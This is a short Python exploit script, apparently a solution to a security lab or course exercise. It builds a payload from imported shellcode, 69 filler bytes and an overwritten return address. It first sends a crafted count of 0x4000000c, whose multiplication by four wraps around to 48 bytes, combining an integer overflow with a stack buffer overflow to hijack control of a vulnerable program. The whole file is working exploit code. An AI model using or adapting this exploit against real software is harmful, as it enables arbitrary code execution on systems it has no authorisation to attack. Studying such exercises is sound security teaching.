from shellcode import shellcode
from struct import pack 
import sys

bs_str = 'l'*69 #how many bs bytes to buffer overflow until return address
bs_bytes = bytes(bs_str, 'utf-8')

return_address = pack("<I", 0xfffe9c50)
payload = shellcode + bs_bytes + return_address

sys.stdout.buffer.write(pack("<I", 0x4000000c)) #count (0x4000000c * 4 = 0x1_0000_0030 = 48 bytes) 
sys.stdout.buffer.write(payload) #count 

